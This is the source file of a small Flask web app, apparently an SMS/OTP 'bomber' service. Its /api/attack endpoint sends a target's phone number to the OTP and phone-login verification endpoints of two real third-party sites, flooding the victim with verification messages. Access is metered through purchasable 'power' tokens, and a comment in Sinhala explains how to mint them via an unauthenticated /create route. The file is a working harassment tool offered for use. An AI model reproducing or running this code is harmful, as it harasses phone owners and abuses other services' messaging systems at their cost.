from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
import os, base64, requests

app = Flask(__name__)

# Database configuration
basedir = os.path.abspath(os.path.dirname(__file__))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'void_os.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class Token(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(50), unique=True)
    power = db.Column(db.Integer)

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    key_input = data.get('token')
    token = Token.query.filter_by(key=key_input).first()
    if token and token.power > 0:
        token.power -= 1
        db.session.commit()
        return jsonify({"status": "granted", "power": token.power})
    return jsonify({"status": "denied"})

@app.route('/api/attack', methods=['POST'])
def attack():
    target = request.json.get('target')
    v_type = request.json.get('type')
    h = {"User-Agent": "Mozilla/5.0"}
    try:
        if v_type == 'IKMAN':
            requests.get(f"https://ikman.lk/data/phone_number_login/verifications/phone_login?phone={target}", headers=h, timeout=5)
        elif v_type == 'ICT':
            requests.post(f"https://ictfromabc.com/api/request-otp/{target}", headers=h, timeout=5)
    except: pass
    return jsonify({"status": "sent"})

# Token ekak hadaganna: yoursite.com/create/KEYNAME/10
@app.route('/create/<key>/<int:p>')
def create(key, p):
    new_t = Token(key=key, power=p)
    db.session.add(new_t)
    db.session.commit()
    return f"Token {key} Created!"

if __name__ == '__main__':
    app.run(debug=True)
